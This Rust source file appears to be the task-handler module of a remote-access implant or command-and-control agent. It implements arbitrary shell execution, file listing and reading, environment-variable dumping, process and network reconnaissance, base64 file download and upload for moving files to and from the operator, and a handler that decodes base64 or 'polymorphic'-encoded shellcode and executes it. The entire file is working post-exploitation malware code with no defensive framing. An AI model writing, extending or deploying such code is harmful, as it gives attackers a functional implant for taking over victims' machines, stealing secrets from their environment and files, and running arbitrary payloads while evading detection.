use super::TaskStatus;
use base64::Engine;
use std::process::Command;

/// Execute a shell command, cross-platform.
pub fn shell(args: &[String]) -> (TaskStatus, String) {
    if args.is_empty() {
        return (TaskStatus::Error, "No command provided".to_string());
    }
    let cmd_str = args.join(" ");

    let output = if cfg!(target_os = "windows") {
        Command::new("cmd").args(["/c", &cmd_str]).output()
    } else {
        Command::new("sh").arg("-c").arg(&cmd_str).output()
    };

    match output {
        Ok(output) => {
            let mut result = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr);
            if !stderr.is_empty() {
                if !result.is_empty() {
                    result.push('\n');
                }
                result.push_str("[stderr] ");
                result.push_str(&stderr);
            }
            if output.status.success() {
                (TaskStatus::Success, result)
            } else {
                (
                    TaskStatus::Error,
                    format!(
                        "exit {}: {}",
                        output.status.code().unwrap_or(-1),
                        result
                    ),
                )
            }
        }
        Err(e) => (TaskStatus::Error, format!("exec failed: {e}")),
    }
}

pub fn ls(args: &[String]) -> (TaskStatus, String) {
    let path = args.first().map(|s| s.as_str()).unwrap_or(".");
    match std::fs::read_dir(path) {
        Ok(entries) => {
            let mut lines = Vec::new();
            for entry in entries.flatten() {
                let meta = entry.metadata().ok();
                let kind = meta
                    .as_ref()
                    .map(|m| if m.is_dir() { "d" } else { "-" })
                    .unwrap_or("?");
                let size = meta.as_ref().map(|m| m.len()).unwrap_or(0);
                lines.push(format!(
                    "{} {:>10} {}",
                    kind,
                    size,
                    entry.file_name().to_string_lossy()
                ));
            }
            lines.sort();
            (TaskStatus::Success, lines.join("\n"))
        }
        Err(e) => (TaskStatus::Error, format!("ls {path}: {e}")),
    }
}

pub fn cat(args: &[String]) -> (TaskStatus, String) {
    if args.is_empty() {
        return (TaskStatus::Error, "No path provided".to_string());
    }
    match std::fs::read_to_string(&args[0]) {
        Ok(data) => (TaskStatus::Success, data),
        Err(e) => (TaskStatus::Error, format!("{}: {e}", args[0])),
    }
}

pub fn pwd() -> (TaskStatus, String) {
    match std::env::current_dir() {
        Ok(p) => (TaskStatus::Success, p.display().to_string()),
        Err(e) => (TaskStatus::Error, e.to_string()),
    }
}

pub fn whoami() -> (TaskStatus, String) {
    if cfg!(target_os = "windows") {
        shell(&["whoami".to_string()])
    } else {
        shell(&["whoami".to_string()])
    }
}

pub fn ps() -> (TaskStatus, String) {
    if cfg!(target_os = "windows") {
        shell(&["tasklist /FO CSV /NH".to_string()])
    } else {
        shell(&["ps aux".to_string()])
    }
}

pub fn env_cmd() -> (TaskStatus, String) {
    let mut vars: Vec<String> = std::env::vars().map(|(k, v)| format!("{k}={v}")).collect();
    vars.sort();
    (TaskStatus::Success, vars.join("\n"))
}

pub fn download(args: &[String]) -> (TaskStatus, String) {
    if args.is_empty() {
        return (TaskStatus::Error, "No path provided".to_string());
    }
    match std::fs::read(&args[0]) {
        Ok(data) => {
            let encoded = base64::engine::general_purpose::STANDARD.encode(&data);
            (TaskStatus::Success, format!("b64:{encoded}"))
        }
        Err(e) => (TaskStatus::Error, format!("{}: {e}", args[0])),
    }
}

/// Upload file to agent filesystem.
/// Args: [path, base64_data]
pub fn upload(args: &[String]) -> (TaskStatus, String) {
    if args.len() < 2 {
        return (
            TaskStatus::Error,
            "Usage: upload <path> <base64_data>".to_string(),
        );
    }
    let path = &args[0];
    let b64_data = &args[1];

    match base64::engine::general_purpose::STANDARD.decode(b64_data) {
        Ok(data) => match std::fs::write(path, &data) {
            Ok(()) => (
                TaskStatus::Success,
                format!("Wrote {} bytes to {path}", data.len()),
            ),
            Err(e) => (TaskStatus::Error, format!("write {path}: {e}")),
        },
        Err(e) => (TaskStatus::Error, format!("base64 decode: {e}")),
    }
}

pub fn id() -> (TaskStatus, String) {
    if cfg!(target_os = "windows") {
        shell(&["whoami /all".to_string()])
    } else {
        shell(&["id".to_string()])
    }
}

pub fn hostname() -> (TaskStatus, String) {
    shell(&["hostname".to_string()])
}

pub fn netstat() -> (TaskStatus, String) {
    if cfg!(target_os = "windows") {
        shell(&["netstat -an".to_string()])
    } else {
        shell(&["ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null".to_string()])
    }
}

/// Collect comprehensive system information.
pub fn sysinfo() -> (TaskStatus, String) {
    let mut info = Vec::new();

    info.push(format!("hostname: {}", std::env::var("HOSTNAME")
        .or_else(|_| std::env::var("COMPUTERNAME"))
        .unwrap_or_else(|_| "unknown".to_string())));
    info.push(format!("os: {}", std::env::consts::OS));
    info.push(format!("arch: {}", std::env::consts::ARCH));
    info.push(format!("pid: {}", std::process::id()));

    if let Ok(user) = std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
    {
        info.push(format!("user: {user}"));
    }
    if let Ok(cwd) = std::env::current_dir() {
        info.push(format!("cwd: {}", cwd.display()));
    }
    if let Ok(home) = std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
    {
        info.push(format!("home: {home}"));
    }

    // Network interfaces (best-effort)
    if cfg!(target_os = "linux") {
        if let Ok(output) = Command::new("sh")
            .arg("-c")
            .arg("ip -4 addr show 2>/dev/null | grep inet || hostname -I 2>/dev/null")
            .output()
        {
            let net = String::from_utf8_lossy(&output.stdout).trim().to_string();
            if !net.is_empty() {
                info.push(format!("net: {net}"));
            }
        }
    } else if cfg!(target_os = "windows") {
        if let Ok(output) = Command::new("cmd")
            .args(["/c", "ipconfig | findstr /i \"IPv4\""])
            .output()
        {
            let net = String::from_utf8_lossy(&output.stdout).trim().to_string();
            if !net.is_empty() {
                info.push(format!("net: {net}"));
            }
        }
    }

    (TaskStatus::Success, info.join("\n"))
}

/// Execute raw shellcode from base64-encoded input.
/// Args: [base64_shellcode]
pub fn execute_shellcode(args: &[String]) -> (TaskStatus, String) {
    if args.is_empty() {
        return (
            TaskStatus::Error,
            "No shellcode provided (expected base64)".to_string(),
        );
    }

    let shellcode = match base64::engine::general_purpose::STANDARD.decode(&args[0]) {
        Ok(data) => data,
        Err(e) => {
            return (
                TaskStatus::Error,
                format!("base64 decode failed: {e}"),
            )
        }
    };

    // Check for polymorphic encoding prefix
    let final_shellcode = if args.len() > 1 && args[1] == "--encoded" {
        match crate::encoding::decode_payload(&shellcode) {
            Some(decoded) => decoded,
            None => {
                return (
                    TaskStatus::Error,
                    "Failed to decode polymorphic payload".to_string(),
                )
            }
        }
    } else {
        shellcode
    };

    match crate::exec::shellcode_exec(&final_shellcode) {
        Ok(()) => (TaskStatus::Success, "shellcode executed".to_string()),
        Err(e) => (TaskStatus::Error, format!("shellcode exec failed: {e}")),
    }
}
